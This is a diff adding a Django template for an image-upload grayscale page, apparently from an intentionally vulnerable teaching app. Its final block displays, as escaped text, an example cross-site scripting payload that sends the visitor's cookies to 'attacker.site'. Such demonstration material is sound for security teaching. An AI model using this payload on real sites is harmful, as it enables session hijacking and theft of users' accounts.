@@ -1,0 +1,26 @@
+{% extends "base.html" %}
+{% load i18n %}
+{% block body %}
+{% include "header.html" %}
+{% if file_path %}
+<img src="/{{ file_path }}"/><br/><br/>
+<input type="button" onClick='history.back();' value="{% trans 'label.history.back' %}"/><br/>
+{% else %}
+<form action="" method="post" enctype="multipart/form-data">
+    {% csrf_token %}
+    <p>{% trans 'msg.convert.grayscale' %}<p/>
+    <input type="file" name="file" size="60"/>
+    <p>{% trans 'msg.select.upload.file' %}<p/>
+    <input type="submit" value="{% trans 'label.upload' %}"/>
+</form>
+{% endif %}
+<br/>
+{% include "messages.html" %}
+<pre id="code" class="prettyprint lang-html">
+&lt;script&gt;
+var img = document.createElement(&#039;img&#039;);
+img.src = &#039;http://attacker.site?c=&#039; + encodeURI(document.cookie);
+document.body.appendChild(img);
+&lt;/script&gt;
+</pre>
+{% endblock %}
